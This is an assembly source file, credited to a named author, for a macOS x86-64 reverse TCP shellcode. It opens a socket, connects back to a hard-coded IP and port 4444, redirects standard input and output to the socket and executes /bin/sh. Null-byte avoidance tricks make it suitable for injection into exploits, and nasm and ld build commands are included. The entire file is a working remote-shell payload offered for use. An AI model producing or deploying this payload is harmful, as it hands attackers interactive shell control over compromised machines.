;osx x64 reverse tcp 
;Jacob Hammack
;jacob.hammack@hammackj.com
;http://www.hammackj.com
;
;props to http://www.thexploit.com/ for the blog posts on x64 osx asm
;I borrowed some of his code

;nasm -f macho reverse_tcp.s -o reverse_tcp.o
;ld -o reverse_tcp -e start reverse_tcp.o

BITS 64
    
section .text
global start

start:
	mov r8b, 0x02          ; Unix class system calls = 2
	shl r8, 24             ; shift left 24 to the upper order bits
	or r8, 0x61            ; setuid = 23, or with class = 0x2000017
	mov rax, r8

;Socket
	xor rdx, rdx
	mov rsi, rdx ;AF_NET = 1
	inc rsi		
	mov rdi, rsi ; SOCK_STREAM = 2
	inc rdi
	syscall

	mov r12, rax ; Save the socket

;Sock_addr
	;		10.69.69.3 4444 
	;		 0X036969104444
	;mov r13, 0x0345450A5C110002
	; + FF to the address to prevent null, then sub it when we need to use the sock_addr

	;mov r13, 0x0345450A5C110101
	mov r13, 0xFFFFFFFF5C110101
	mov r9b, 0xFF
	sub r13, r9

	;		127.0.0.1 4444
	;mov r13, 0x0100007F5C110002
	push r13
	mov r13, rsp


;Connect
	inc r8
	mov rax, r8
	mov rdi, r12 
	mov rsi, r13
	add rdx, 0x10	
	syscall

	sub r8, 0x8
	xor rsi, rsi

dup:
	mov rax, r8
	mov rdi, r12
	syscall
	
	cmp rsi, 0x2
	inc rsi 
	jbe dup

	sub r8, 0x1F
	mov rax, r8

;exec:
    ;mov r9, '/bin/sh'
    xor rdx, rdx 
	;mov r13, 0x068732f6e69622f ; '/bin/sh' in hex
	mov r13, 0x68732f6e69622fFF ; '/bin/sh' in hex

	shr r13, 8

    push r13
    mov rdi, rsp 
    xor rsi, rsi 
    syscall

